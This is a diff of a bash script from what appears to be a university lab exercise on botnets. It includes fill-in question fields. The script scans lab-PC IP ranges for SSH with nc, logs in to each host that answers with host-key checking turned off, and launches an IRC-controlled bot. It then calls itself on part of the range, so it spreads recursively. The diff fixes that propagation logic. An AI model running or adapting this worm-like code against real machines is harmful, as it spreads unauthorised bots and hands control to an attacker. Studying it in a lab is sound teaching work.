@@ -42,7 +42,7 @@
 # Run "./ergo mkcerts" then "./ergo run" to start the server.
 
 # QUESTION: What is the standard plaintext port (tls=false) that our bots use to connect to the IRC server?
-# ANSWER: What is the nickname that 
+# ANSWER: 
 
 
 # [JOINING IRC SERVER AS BOTMASTER]
@@ -74,15 +74,14 @@
 # QUESTION: What can you infer about this ip range?
 # ANSWER: 
 
-# Make a note of the endings (last byte) of these two ip addresses.
+# Make a note of the suffix of these two ip addresses.
 # You will pass them as arguments when you call this script later.
 
 
 # [INFECTION -> PROPAGATION -> CONNECTION]
 
-# TODO: Replace this with the ip address of the lab pc
-# you wish to run the IRC server on.
-irc_server="142.1.46.4"
+# TODO: Replace this with the ip address of the lab pc that you ran the IRC server on earlier.
+irc_server_ip="142.1.46.21"
 
 script_dir=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
 
@@ -94,8 +93,6 @@ i=$range_start
 
 # Iterate over ip range to find new hosts to infect.
 while [ $i -le $range_end ]; do
-    echo "$i, $range_end"
-
     ip_address="$ip_prefix$i"
 
     nc -zv -w 1 $ip_address ssh
@@ -104,9 +101,10 @@ while [ $i -le $range_end ]; do
 
         # Divide and conquer:
         # Partition the ip range for the new bot.
-        new_range_end=$range_end
-        range_end=$(( i + ((range_end - i) / 2) ))
-        new_range_start=$(( left_range_end + 1 ))
+        bot_range_end=$range_end
+        new_range_end=$(( i + ((range_end - i) / 2) ))
+        bot_range_start=$(( new_range_end + 1 ))
+        range_end=$new_range_end
 
         # Normally, this is when we attempt to gain unauthorized access to each victim machine,
         # however, since we are already logged in as a user, we can ssh into the other machines
@@ -119,7 +117,7 @@ while [ $i -le $range_end ]; do
         # - Recursively infect new victims using a partition of the ip range
         # Make sure to background the processes so that they can both run at the same time.
         # TODO: Complete the command below.
-        command="cd $script_dir; ./bot.py $irc_server & ./botnet.sh $new_range_start $new_range_end &"
+        command="cd $script_dir; ./bot.py $irc_server_ip & ./botnet.sh $bot_range_start $bot_range_end &"
 
         ssh -o "StrictHostKeyChecking no" $ip_address $command &
     fi
@@ -129,7 +127,7 @@ done
 
 # After you have completed all of the previous steps, in a separate terminal,
 # call "./botnet.sh <range_start> <range_end>" with the appropriate arguments
-# to begin infecting the lab pcs.
+# to begin infecting the lab pcs. Remember the note you made earlier about the ip suffixes?
 
 
 # [CONTROL]
